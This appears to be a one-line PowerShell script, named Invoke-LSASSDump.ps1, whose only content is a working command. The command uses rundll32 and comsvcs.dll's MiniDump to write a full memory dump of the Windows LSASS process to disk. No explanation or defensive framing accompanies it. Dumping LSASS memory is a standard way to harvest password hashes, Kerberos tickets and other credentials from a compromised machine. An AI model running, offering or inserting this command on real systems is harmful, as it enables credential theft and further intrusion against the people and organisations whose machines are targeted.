# Invoke-LSASSDump.ps1
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\lsass.dmp full
